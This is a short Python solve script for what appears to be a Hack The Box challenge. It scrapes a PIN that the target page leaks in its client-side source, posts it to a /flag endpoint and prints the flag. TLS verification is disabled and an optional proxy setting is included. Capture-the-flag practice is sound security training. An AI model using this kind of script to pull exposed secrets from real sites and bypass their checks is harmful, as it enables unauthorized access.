import requests
import argparse
import re

# My session setup
session = requests.Session()
session.verify = False


def get_secret(hostname):
    res = session.get(hostname)
    html_str = res.content.decode("utf-8")
    secret_pattern = r'correctPin: "(\d+)"'
    match = re.search(secret_pattern, html_str)
    return match.group(1)


def get_flag(hostname):
    flag_pattern = r"HTB{.*?}"
    data = {"pin": get_secret(hostname)}
    res = session.post(
        hostname + "/flag", headers={"Content-Type": "application/json"}, json=data
    )
    html_str = res.content.decode("utf-8")
    match = re.search(flag_pattern, html_str)
    print(match.group(0))


if __name__ == "__main__":
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u", "--url", help="Target ip address or hostname", required=True
    )
    parser.add_argument(
        "-d",
        "--debug",
        help="Instruct our web requests to use our defined proxy",
        action="store_true",
        required=False,
    )

    args = parser.parse_args()
    if args.debug:
        session.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }

    target_url = args.url
    get_flag(target_url)
